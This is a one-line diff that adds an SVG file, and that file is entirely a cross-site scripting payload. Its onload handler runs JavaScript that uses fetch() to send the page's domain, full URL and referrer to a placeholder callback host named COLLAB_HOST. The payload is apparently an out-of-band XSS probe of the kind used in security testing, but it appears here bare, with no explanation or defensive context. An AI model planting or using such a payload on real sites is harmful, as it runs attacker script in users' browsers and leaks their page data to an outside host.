@@ -1,0 +1,1 @@
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://COLLAB_HOST/xss-oob?d='+encodeURIComponent(document.domain)+'&amp;u='+encodeURIComponent(location.href)+'&amp;r='+encodeURIComponent(document.referrer),{mode:'no-cors'})"/>
